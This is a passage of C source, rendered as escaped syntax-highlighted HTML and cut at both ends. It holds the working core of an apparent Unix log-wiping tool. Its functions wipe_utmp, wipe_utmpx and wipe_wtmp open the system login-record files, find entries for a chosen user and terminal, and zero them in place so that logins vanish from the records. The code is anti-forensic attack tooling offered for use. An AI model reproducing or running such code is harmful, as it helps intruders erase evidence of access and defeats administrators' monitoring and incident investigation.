class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Patching %s .... \u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eUTMP_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003efflush\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estdout\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t * Open the utmp file.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eUTMP_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eO_RDWR\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Opening %s\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eUTMP_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t * Copy utmp file excluding relevent entries. \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t */\u003c/span\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"nf\"\u003eread\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nf\"\u003estrncmp\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eut_name\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nf\"\u003estrlen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t  \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nf\"\u003estrncmp\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eut_line\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nf\"\u003estrlen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e))))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ebzero\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003elseek\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003eint\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"n\"\u003eSEEK_CUR\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Done.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * UTMPX editing if supported.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifdef HAVE_UTMPX\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nf\"\u003ewipe_utmpx\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"kt\"\u003eint\u003c/span\u003e \t\t\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003eutmpx\u003c/span\u003e\t\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Patching %s .... \u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eUTMPX_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003efflush\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estdout\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t * Open the utmp file and temporary file.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eUTMPX_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eO_RDWR\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Opening %s\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eUTMPX_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nf\"\u003eread\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nf\"\u003estrncmp\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eut_name\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nf\"\u003estrlen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t  \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nf\"\u003estrncmp\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eut_line\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nf\"\u003estrlen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e))))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ebzero\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003elseek\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003eint\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"n\"\u003eSEEK_CUR\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Done.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * WTMP editing.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nf\"\u003ewipe_wtmp\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"kt\"\u003eint\u003c/span\u003e\t\t\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003eutmp\u003c/span\u003e\t\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Patching %s .... \u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eWTMP_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003efflush\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estdout\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan 